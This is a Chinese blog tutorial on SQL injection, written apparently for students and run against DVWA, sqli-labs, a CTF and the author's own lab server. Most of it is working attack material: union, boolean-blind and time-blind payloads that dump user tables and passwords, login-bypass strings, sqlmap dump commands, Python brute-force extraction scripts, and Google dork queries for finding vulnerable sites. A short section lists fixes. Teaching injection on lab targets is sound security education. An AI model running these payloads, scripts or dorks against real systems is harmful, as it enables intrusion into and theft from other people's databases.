---
title: 深入剖析SQL注入(更新中)
author: 简文涛
categories:
  - Web
tags:
  - SQL注入
comments: true
top: false
img: 'https://i.loli.net/2020/05/02/nhBlQoAitqCTsJa.jpg'
abbrlink: 32179
date: 2020-05-02 13:20:19
updated:
summary: SQL注入是通过将恶意的SQL语句插入到Web应用的输入参数中，欺骗服务器执行恶意的SQL命令的攻击。
permalink:
---
<center><font color=pink size=8 weigh:500>深入剖析SQL注入</font></center>

# 前言

本文章产生的缘由是因为专业老师，让我给本专业的同学讲一哈SQL注入和XSS入门，也就是本文的入门篇，讲完两节课后，发现自己对于SQL注入的理解也就仅仅局限于入门，于是有了后面章节的产生。

# 入门篇

## 一、课程目标

> 听完这节课你能学到些什么👇


- [x] 知道什么是Sql注入
- [x] 实现最基础的Sql注入
- [x] 学会使用SqlMap工具
- [x] 了解一些Web安全基本知识

## 二、初识SQL注入

### 1 什么是SQL

> SQL（Structured Query Language） 是用于`访问和处理数据库`的标准的计算机语言,SQL与数据库程序协同工作，比如 SQL Server、MySQL、Oracle、SQLite、MongoDB、PostgreSQL、MS Access、DB2以及其他数据库系统。

![2020年5月](https://i.loli.net/2020/05/02/OxEr91piQSkj7Mc.png)

**SQL执行流程**

![](https://i.loli.net/2020/05/02/k1MB6fsTlyzXH9J.jpg)

###  2 什么是SQL注入

> SQL注入是指web应用程序对**用户输入数据的合法性没有判断或过滤不严**，攻击者可以在web应用程序中事先定义好的查询语句的结尾上**添加额外的SQL语句**，以此来实现欺骗数据库服务器**执行非授权的任意查询**，从而得到相应的数据信息。

**通俗来说：**OWASP Top10之一，SQL注入是通过将`恶意的SQL语句`插入到Web应用的输入参数中，`欺骗服务器`执行恶意的SQL命令的攻击。

**SQL注入流程**

![](https://i.loli.net/2020/05/02/Ligwo95FqyQaHcV.png) 

### 3 SQL注入分类

**根据SQL数据类型分类**

- 整型注入
- 字符型注入

**根据注入的语法分类**

- 联合查询注入（Union query SQL injection）
- 报错型注入（Error-based SQL injection）
- 布尔型注入（Boolean-based blind SQL injection）
- 延时注入（Time-based blind SQL injection）
- 多语句查询注入 （Stacted queries SQL injection）

##  三、初试SQL注入

### 1 手工注入常规思路

**1.判断是否存在注入，注入是字符型还是数字型** 
2.猜解 SQL 查询语句中的字段数
3.确定显示的字段顺序 
4.获取当前数据库 
5.获取数据库中的表 
6.获取表中的字段名 
7.显示字段信息

### 2 实现完整手工注入

**靶机：DVWA**

将DVWA的级别设置为low，可以看到源码中是一句简单的查询语句，没有进行任何过过滤

```sql
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';
```
因此我们完全可以插入自己想要执行的sql语句，那么我们开始吧！

输入我们输入1，那么执行的语句就是

`SELECT first_name, last_name FROM users WHERE user_id = '1'`

#### 1.判断注入是字符型还是数字型

> 字符型和数字型最大区别: 数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的

数字型：select * from table where id =$id

字符型：select * from table where id='$id'

判断数字型

```sql
1 and 1=1 #永真式   select * from table where id=1 and 1=1
1 and 1=2 #永假式   select * from table where id=1 and 1=2
#if页面运行错误，则说明此Sql注入为数字型注入。
```

判断字符型

```sql
1' and '1'='1  

1' and '1'='2 
#if页面运行错误，则说明此 Sql 注入为字符型注入。
```

执行上面两种方式一种就可得出结论，显示这个是字符型注入

#### 2.猜解SQL查询语句中的字段数

```sql
1' or 1=1 order by 1 #    查询成功  【order by x 对第几列进行排序】1'  order by 1 #  id=‘1‘  #’ 注释
1' or 1=1 order by 2 #    查询成功
1' or 1=1 order by 3 #    查询失败
```

![](../images/%E6%B5%85%E8%B0%88SQL%E6%B3%A8%E5%85%A5/5d2157a14b88a69607.png)
说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。

#### 3.确定显示的字段顺序

```sql
1' union select 1,2 #    
```

![](https://i.loli.net/2019/07/07/5d2157a15b62731652.png)
说明执行的SQL语句为select First name,Surname from xx where ID='id'

**理解select 1,2**：例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结：果。

#### 4.获取当前数据库

上步知道字段显示顺序，那我们在字段2的位置上显示数据库试试

```sql
1' union select 1,database() #
```
![](https://i.loli.net/2019/07/07/5d215880225ab67916.png)
说明当前的数据库为dvwa。

#### 5.获取数据库中的表

```sql
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

1' union select 1,table_name from information_schema.tables where table_schema='dvwa' #

```

**information_schema.tables**存储了数据表的元数据信息，下面对常用的字段进行介绍：

- table_schema: 记录**数据库名**；
- table_name: 记录**数据表名**；
- engine : 存储**引擎**；
- table_rows: 关于表的粗略行估计；
- data_length : 记录**表的大小**（单位字节）；
- index_length : 记录表的**索引的大小**；
- row_format: 可以查看数据表**是否压缩**过；

![](../images/%E6%B5%85%E8%B0%88SQL%E6%B3%A8%E5%85%A5/5d2158801e99398127.png)

说明数据库dvwa中一共有两个表，guestbook与users。

#### 6.获取表中的字段名

```sql
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
```

![](../images/%E6%B5%85%E8%B0%88SQL%E6%B3%A8%E5%85%A5/5d215a91e7a8398188.png)

说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login

#### 7.获取字段信息

```sql
1' union select group_concat(user_id,first_name),group_concat(password) from users #

1' union select group_concat(concat_ws(':',first_name,password)),2 from users #

1' union select first_name,password from users #
```

![](https://i.loli.net/2019/07/07/5d21587feccc627920.png)

这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。

### 3 实战演练一哈

就以我自己搭建的[靶机](http://139.224.112.182:8801/)为例子🌰

在主页搜索框发现注入点，话不多说开始注入

```sql
#判断注入类型 #【数字型】
1 and 1=1 
1 and 1=2 

#查询数据库 #【test】
-1 union select 1,2,database()

#获取数据库中的表 #【admin、news】
-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test' 

#获取表中的字段名 #【 user_id、user_name、user_pass】
-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='admin'

#获取字段信息 【admin:mysql】
-1 union select 1,group_concat(user_name),group_concat(user_pass) from admin
-1 union select 1,user_name,user_pass from admin 
```
我们又快速的实现了一次手工注入，但是你有没和我一样的感觉，太麻烦了，有更方便的方法吗，emm...

当然有啦，使用SqlMap工具可以快速实现注入👇

## 四、使用SqlMap注入

具体使用方法请问我之前写的文章👉[sqlmap使用方法](https://www.jianshu.com/p/a46abd1e67aa)

#### SqlMap初体验

接着使用上面靶机进行测试

```bash
#查询数据库 #【test】
python sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 --dbs

#获取数据库中的表 #【admin、news】
python sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test --tables

#获取表中的字段名 #【 user_id、user_name、user_pass】
python sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test -T admin --columns

#获取字段信息 【admin:mysql】
python sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test -T admin -C user_name,user_pass --dump
```

#### 一道CTF题目

题目：简单的sql注入2

地址：http://139.224.112.182:8087/ctf_collect

解析：https://www.jianshu.com/p/1aeedef99f21

**1**.查询当前数据库(空格被过滤可以使用tamper脚本中space2comment)

```bash
python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dbs 
```

![](https://i.loli.net/2020/05/04/duk1Pzgn8vseYVw.png)
发现web1数据库
**2**.查询数据库中的表

```bash
python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment -D web1 --tables
```

![](https://i.loli.net/2020/05/04/VqgauHCbZ7SIFYL.png)
发现flag表
**3**.查询flag表中字段名

````bash
python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --columns -T flag -D web1
````

![](https://i.loli.net/2020/05/04/DvPQ6OponqHuCZz.png)
发现flag字段
**4**.查询字段flag信息

```bash
python sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dump -C flag -T flag -D web1
```
<img src="https://i.loli.net/2020/05/04/TfZAoObdMPiLJIt.png" style="zoom: 80%;" />

## 五、发现注入点

### 1 使用漏洞扫描工具

工具：OWASP ZAP、D盾、Seay

万能密码：

```sql
1' or 1=1 # 用户名和密码都可  
' or '1'='1' -- 

1' or '1'='1 密码才可
```

![](https://i.loli.net/2020/05/04/6p8DMKTa2ywjRVo.png)

```
<script>alert(1);</script>
```

![](https://i.loli.net/2020/05/04/LFXgSvye6iY7jCt.png)



### 2 通过Google Hacking 寻找SQL注入

> 看到这里我们已经完成了一次最基础的GET字符型Sql注入，有人可能会问了，这是自己搭建的靶机，知道是存在sql注入，真实环境中如何去发现Sql注入呢

```
inurl:php?id=
inurl:.asp?id=
inurl:index.php?id=
inurl:showproduct.asp?id=
site:http://139.224.112.182:8802/ inurl:php?id
site:https://jwt1399.top inurl:.html
......
```

服务器报错，并把错误信息返回到网页上面。根据错误信息，判断这里大概率存在注入点。

## 六、 修复建议

1. 过滤用户输入的数据。默认情况下，应当认为用户的所有输入都是不安全的。
2. 对于整数，判断变量是否符合[0-9]的值；其他限定值，也可以进行合法性校验；
3. 对于字符串，对SQL语句特殊字符进行转义(单引号转成两个单引号，双引号转成两个双引号)。
4. 绑定变量，使用预编译语句

# 进阶篇

## SQL注入前你要知道

> 不要急于进行SQL注入，请先看完这部分，很重要！，很重要！，很重要！

**1.基本的SQL语句查询源码**    

```mysql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
# LIMIT [偏移量],行数
```

通常情况下联合查询(union)时需要将前面的查询结果限定为空集，后面的查询结果才能显示出来。例如id值设为负数或0，因为带有`LIMIT 0,1`则只能显示一条数据

```mysql
?id=-1 union select 1,2,3
?id=0  union select 1,2,3
?id=-1' union select 1,2,group_concat(username,password) from users
```

**2.MySQL数据库几种注释**

|  注释符   | 描述                                                         |
| :-------: | ------------------------------------------------------------ |
|   ` #`    | 单行注释  URL编码 `%23`，在URL框直接使用中`#`号必须用`%23`来表示，#在URL框中有特定含义，代表锚点 |
| `--空格`  | 单行注释 ，实际使用中`--空格`用`--+`来表示。因为在URL框中，浏览器在发送请求的时候会把URL末尾的空格舍去，所以用`--+`代替`--空格` |
| `/*  */`  | 块注释                                                       |
| `/*!  */` | 内联注释                                                     |

**3.数据库相关--Information_schema库**

- `information_schema`，系统数据库，包含所有数据库相关信息。
- `information_schema.schemata`中`schema_name`列，字段为所有数据库名称。
- `information_schema.tables`中`table_name`列对应数据库所有表名
- `information_schema.columns`中，`column_name`列对应所有列名

**5.连接字符串函数**

[concat(),concat_ws()与及group_concat()的用法](https://links.jianshu.com/go?to=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1595349117525189591%26wfr%3Dspider%26for%3Dpc)

- `concat(str1,str2,…)`——没有分隔符地连接字符串

- `concat_ws(separator,str1,str2,…)`——含有分隔符地连接字符串

- `group_concat(str1,str2,…)`——连接一个组的所有字符串，并以逗号分隔每一条数据，知道这三个函数能一次性查出所有信息就行了。

**6**.MySQL常用的系统函数

```mysql
version()            #MySQL版本
user()               #数据库用户名
database()           #数据库名
@@basedir            #数据库安装路径
@@datadir            #数据库文件存放路径
@@version_compile_os #操作系统版本
```
**7.**[sql注入之你问我答]( https://www.cnblogs.com/xishaonian/p/6036909.html)

## 盲注

> SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

### 手工盲注思路

手工盲注的过程，就像你与一个机器人聊天，
这个机器人知道的很多，但只会回答“`是`”或者“`不是`”，
因此你需要询问它这样的问题，例如“`数据库名字的第一个字母是不是a啊？`”
通过这种机械的询问，最终获得你想要的数据。

### 手工盲注的步骤

1.判断是否存在注入，注入是字符型还是数字型 
2.猜解当前数据库名 
3.猜解数据库中的表名
4.猜解表中的字段名 
5.猜解数据

### 盲注常用函数

| 函数                            | 描述                                                         |
| ------------------------------- | ------------------------------------------------------------ |
| left(字符串，截取长度)          | 从左边截取指定长度的字符串                                   |
| length(字符串)                  | 获取字符串的长度                                             |
| ascii(字符串)                   | 将指定字符串进行ascii编码                                    |
| substr(字符串，start，截取长度) | 截取字符串，可以指定起始位置和长度                           |
| mid(字符串，start，截取长度)    | 截取字符串，可以指定起始位置和长度                           |
| count()                         | 计算总数，返回匹配条件的行数。                               |
| sleep(n)                        | 将程序挂起n秒                                                |
| if(参数1，参数2，参数3)         | 参数1为条件，当参数1返回的结果为true时，执行参数2，否则执行参数3 |

## 布尔盲注

### **布尔注入利用情景**

- 页面上没有显示位，并且没有输出SQL语句执行错误信息
- 只能通过页面返回正常与不正常判断

### 实现完整手工布尔盲注

靶机：sqli-labs第5关

#### 1 .查看页面变化，判断sql注入类别 

```mysql
?id=1 and 1=1
?id=1 and 1=2
【字符型】
```

#### 2.猜解数据库长度

使用length()判断数据库长度，二分法可提高效率

```mysql
?id=1' and length(database())>5 --+
?id=1' and length(database())<10 --+
?id=1' and length(database())=8 --+
【length=8】
```

#### 3.猜当前数据库名

##### 方法1：使用`substr函数`

```mysql
?id=1' and substr(database(),1,1)>'r'--+
?id=1' and substr(database(),1,1)<'t'--+
?id=1' and substr(database(),1,1)='s'--+
?id=1' and substr(database(),2,1)='e'--+
...
?id=1' and substr(database(),8,1)='y'--+
【security】
```

##### 方法2：使用`ascii函数和substr函数`

```mysql
?id=1' and ascii(substr(database(),1,1))>114 --+
?id=1' and ascii(substr(database(),1,1))<116 --+
?id=1' and ascii(substr(database(),1,1))=115 --+
【security】
```

![ASCill表](https://i.loli.net/2020/05/15/Pqd31eKrgQbzCfL.png)

##### 方法3：使用`left函数`

```mysql
?id=1' and left(database(),1)>'r'--+
?id=1' and left(database(),1)<'t'--+
?id=1' and left(database(),1)='s' --+
?id=1' and left(database(),2)='se' --+
?id=1' and left(database(),3)='sec' --+
...
?id=1' and left(database(),8)='security' --+
【security】
```

##### 方法4：使用`Burpsuite的Intruder模块`

将获取数据库第一个字符的请求包拦截并发送到Intruder模块

设置攻击变量以及攻击类型

![](https://i.loli.net/2020/05/15/k9ZnQNwtxCaPFEK.png)

设置第一个攻击变量，这个变量是控制第几个字符的

![](https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png)

设置第二个攻击变量，这个变量是数据库名字符

![](https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png)

开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到

![](https://i.loli.net/2020/05/15/zixp5ct3E82unDX.png)



#### 4.判断表的个数

count()函数是用来统计表中记录的一个函数，返回匹配条件的行数。

```mysql
?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>0 --+
?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+
【4个表】
```

#### 5.判断表的长度

limit可以被用于强制select语句返回指定的条数。

```mysql
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+
【第一个表长度为6】

?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8 --+
【第二个表长度为8】
```

#### 6.猜解表名

##### 方法1：使用`substr函数`

```mysql
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'d' --+
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'f' --+
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+
...
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)='s' --+
【第一个表名为emails】
```

##### 方法2：使用`Burpsuite的Intruder模块`

使用方法跟上方获得数据库名一样，就不赘述了

![](https://i.loli.net/2020/05/15/4O3Hv2Iekq7tSzw.png)

![](https://i.loli.net/2020/05/15/bdvhEPFcnsYTwQJ.png)

#### 7.猜解字段名和字段信息

```mysql
#确定字段个数
?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')>0 --+
?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')=3 --+
【字段个数为3】

#确定字段名的长度
?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))>0 --+
?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))=2 --+
?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 1,1))=8 --+
【第一个字段长度为2，第二个字段长度为8】

#猜字段名 同上使用burp
?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),1,1)='i'  --+
【...id,username,password...】

#确定字段数据长度
?id=1' and length((select username from users limit 0,1))=4  --+
【第一个字段数据长度为4】

#猜解字段数据 同上使用burp
?id=1' and substr((select username from users limit 0,1),1,1)='d'  --+

?id=1' and ascii(substr((select username from users limit 0,1),1,1))>79  --+
【第一个username数据为dumb】
```

### 使用SQLmap实现布尔盲注

```
--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
--technique:选择注入技术，B:Boolean-based-blind  （布尔型盲注）
--threads 10 :设置线程为10，运行速度会更快
```

```bash
#查询数据库 #【security】
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B --dbs --batch --threads 10

#获取数据库中的表 #【emails、referers、uagents、users】
python sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security  --tables --batch --threads 10

#获取表中的字段名 #【id、username、password】
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users --columns --batch --threads 10

#获取字段信息 #【Dumb|Dumb、dhakkan|dumbo ...】
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users -C username,password --dump --batch --threads 10
```

###  脚本实现布尔盲注

#### 1.获取数据库名长度

  ```python
# coding:utf-8
import requests

# 获取数据库名长度
def database_len():
    for i in range(1, 10):
        url = '''http://139.224.112.182:8087/sqli1/Less-5/'''
        payload = '''?id=1' and length(database())=%d''' %i
        r = requests.get(url + payload + '%23') # %23 <==> --+
        if 'You are in' in r.text:
            print('database_length:', i)
            break
        else:
            print(i)

database_len()
# 【database_length: 8】
  ```

#### 2.获取数据库名

```python
# coding:utf-8
import requests
#获取数据库名
def database_name():
    name = ''
    for j in range(1,9):
        for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
            url = "http://139.224.112.182:8087/sqli1/Less-5/"    
            payload = "?id=1' and substr(database(),%d,1)='%s' --+"  %(j, i) 
            r = requests.get(url + payload)
            if 'You are in' in r.text:
                name = name + i
                print(name)
                break
    print('database_name:', name)

database_name()
# 【database_name: security】
```

#### 3.获取数据库中表

```python
# coding:utf-8
import requests
# 获取数据库表
def tables_name():
    name = ''
    for j in range(1, 30):
        for i in 'abcdefghijklmnopqrstuvwxyz,':
            url = "http://139.224.112.182:8087/sqli1/Less-5/"    
            payload = '''?id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s' --+''' % (j, i)
            r = requests.get(url + payload)
            if 'You are in' in r.text:
                name = name + i
                print(name)
                break
    print('table_name:', name)

tables_name()

#【table_name: emails,referers,uagents,users】
```

#### 4.获取表中字段

```python
# coding:utf-8
import requests

# 获取表中字段
def columns_name():
    name = ''
    for j in range(1, 30):
        for i in 'abcdefghijklmnopqrstuvwxyz,':
            url = "http://139.224.112.182:8087/sqli1/Less-5/"    
            payload = "?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),%d,1)='%s' --+" %(j, i)        
            r = requests.get(url + payload)
            if 'You are in' in r.text:
                name = name + i
                print(name)
                break
    print('column_name:', name)

columns_name()
#【column_name: id,username,password】
```

#### 5.获取字段值

```mysql
# coding:utf-8
import requests
# 获取字段值
def value():
    name = ''
    for j in range(1, 100):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_-':
            url = "http://139.224.112.182:8087/sqli1/Less-5/"  
            payload = "?id=1' and substr((select group_concat(username,password) from users),%d,1)='%s' --+" %(j, i)    
            r = requests.get(url + payload)
            if 'You are in' in r.text:
                name = name + i
                print(name)
                break
    print('value:', name)

value()
```

## 时间盲注

### 时间注入利用情景

- 页面上没有显示位
- 没有输出报错语句
- 正确的sql语句和错误的sql语句页面返回一致

### 手工实现时间盲注

靶机：sqli-labs第9关

```mysql
?id=1 
?id=1'
?id=1"
#不管怎么样都不报错，不管对错一直显示一个固定的页面；

#判断注入点
?id=1' and sleep(3)--+
#页面响应延迟，判断存在时间延迟型注入

#获取数据库名长度
?id=1' and if(length(database())=8,sleep(3),1)--+

#获取数据库名
?id=1' and if(substr(database(),1,1)='s',sleep(3),1)--+
```

**结合`Burpsuite的Intruder模块`爆破数据库名**

将获取数据库第一个字符的请求包拦截并发送到Intruder模块

设置攻击变量以及攻击类型

![](https://i.loli.net/2020/05/15/cYjrQ6ygw3TxJGS.png)设置第一个攻击变量，这个变量是控制第几个字符的

![](https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png)

设置第二个攻击变量，这个变量是数据库名字符

![](https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png)

开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到

![image-20200515211534056](https://i.loli.net/2020/05/15/izwlJ71SsEYByIO.png)



**获取表名、字段名、字段信息等数据方法同上，就不赘述了**

### 使用SQLmap实现时间盲注

```
--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
--technique:选择注入技术，-T:Time-based blind  （基于时间延迟注入）
--threads 10 :设置线程为10，运行速度会更快。
```

```bash
#查询数据库 #【security】
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T --dbs --batch --threads 10

#获取数据库中的表 #【emails、referers、uagents、users】
python sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security  --tables --batch --threads 10

#获取表中的字段名 #【id、username、password】
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security -T users --columns --batch --threads 10 

#获取字段信息 【Dumb|Dumb、dhakkan|dumbo ...】
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security -T users -C username,password --dump --batch --threads 10 

```

### 脚本实现时间盲注

#### 1.获取数据库名长度

```python
# coding:utf-8
import requests
import datetime

# 获取数据库名长度
def database_len():
    for i in range(1, 10):
        url = '''http://139.224.112.182:8087/sqli1/Less-9/'''
        payload = '''?id=1' and if(length(database())=%d,sleep(3),1)--+''' %i
        time1 = datetime.datetime.now()
        r = requests.get(url + payload)
        time2 = datetime.datetime.now()
        sec = (time2 - time1).seconds
        if sec >= 3:
            print('database_len:', i)
            break
        else:
            print(i)
            
database_len()
```

#### 2.获取数据库名

```python
# coding:utf-8
import requests
import datetime

#获取数据库名
def database_name():
    name = ''
    for j in range(1, 9):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz_':
            url = '''http://139.224.112.182:8087/sqli1/Less-9/'''
            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(1),1) --+''' % (j,i)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 1:
                name = name + i
                print(name)
                break
    print('database_name:', name)

database_name()
```

**获取表名、字段名、字段信息等数据的脚本类似上面布尔盲注脚本，就不赘述了**



## SQL注入靶场

### DVWA

#### SQL-Injection

##### Low

![](https://i.loli.net/2019/07/07/5d2157a0b617429320.png)
**分析：**
由代码可知，通过`REQUEST`方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。
**常见注入测试的POC：**
![](https://i.loli.net/2019/07/07/5d2157a0e026b11081.png)

**1.判断是否存在注入，注入是字符型还是数字型**

当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。

`输入1，查询成功`
![](https://i.loli.net/2019/07/07/5d2157a0b5be796424.png)

`输入1'and '1' ='2，查询失败，返回结果为空：`
![](https://i.loli.net/2019/07/07/5d2157a0b3f3273859.png)

`输入1' or '1'='1 页面正常，并返回更多信息，成功查询`

![](https://i.loli.net/2019/07/07/5d2159616334d72827.png)

*``判断存在的是字符型注入。``*

**2.猜解SQL查询语句中的字段数**

```sql
1' or 1=1 order by 1 # 
查询成功
```



![](https://i.loli.net/2019/07/07/5d2157a13017358980.png)

```sql
1' or 1=1 order by 2 # 
查询成功 #是注释作用
```



![](https://i.loli.net/2019/07/07/5d2157a130bfc36506.png)

````sql
1' or 1=1 order by 3 # 
查询失败
````

![](https://i.loli.net/2019/07/07/5d2157a14b88a69607.png)
`说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。`

**3.确定显示的字段顺序**

`输入1' union select 1,2 # 查询成功： #是注释作用`
![](https://i.loli.net/2019/07/07/5d2157a15b62731652.png)
`说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…`

**4.获取当前数据库**
`输入1' union select 1,database() # 查询成功：#是注释作用`
![](https://i.loli.net/2019/07/07/5d215880225ab67916.png)

`说明当前的数据库为dvwa。`

**5.获取数据库中的表**

`输入1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查询成功： #是注释作用`

![](https://i.loli.net/2019/07/07/5d2158801e99398127.png)

`说明数据库dvwa中一共有两个表，guestbook与users。`

**6.获取表中的字段名**

`输入1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' # 查询成功： #是注释作用`

![](https://i.loli.net/2019/07/07/5d215a91e7a8398188.png)

`说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。`

7.下载数据

`输入1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： #是注释作用`

![](https://i.loli.net/2019/07/07/5d21587feccc627920.png)

`这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。`

##### Medium

**分析:**
Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。
![](https://i.loli.net/2019/07/07/5d21587fd0b4470385.png)
**漏洞利用**
虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。

**1.判断是否存在注入，注入是字符型还是数字型**

`抓包更改参数id为1' or 1=1 # 报错： #是注释作用`
![](https://i.loli.net/2019/07/07/5d215880841a018106.png)

`抓包更改参数id为1 or 1=1 #，查询成功`

![](https://i.loli.net/2019/07/07/5d2158809d36989122.png)

`说明存在数字型注入。`
（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）

**2.猜解SQL查询语句中的字段数**

`抓包更改参数id为1 order by 2 #，查询成功：`
![](https://i.loli.net/2019/07/07/5d2159616a21092023.png)

`抓包更改参数id为1 order by 3 #，报错：`

![](https://i.loli.net/2019/07/07/5d215880a147828497.png)

`说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。`

**3.确定显示的字段顺序**

`抓包更改参数id为1 union select 1,2 #，查询成功：`
![](https://i.loli.net/2019/07/07/5d2158812929b87606.png)
`说明执行的SQL语句为select First name,Surname from 表 where ID=id…`

**4.获取当前数据库**

`抓包更改参数id为1 union select 1,database() #，查询成功：`
![](https://i.loli.net/2019/07/07/5d2159616494195158.png)

`说明当前的数据库为dvwa。`

**5.获取数据库中的表**

`抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：`

![](https://i.loli.net/2019/07/07/5d2158816989128964.png)


`说明数据库dvwa中一共有两个表，guestbook与users。`

**6.获取表中的字段名**

`抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询失败：`

![](https://i.loli.net/2019/07/07/5d2159645009a24115.png)

这是因为单引号被转义了，变成了`\'`。可以利用16进制进行绕过 ''

`抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：`

![](https://i.loli.net/2019/07/07/5d21596186ab196293.png)

`说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。`

**7.下载数据**

`抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：`

![](https://i.loli.net/2019/07/07/5d2159620af4d15231.png)


这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。

##### High

![](https://i.loli.net/2019/07/07/5d215961dd3a893165.png)

**分析：**
与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

**漏洞利用:**
虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。

`输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：`

![](https://i.loli.net/2019/07/07/5d21596231dc818326.png)

**特别注意：**High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。

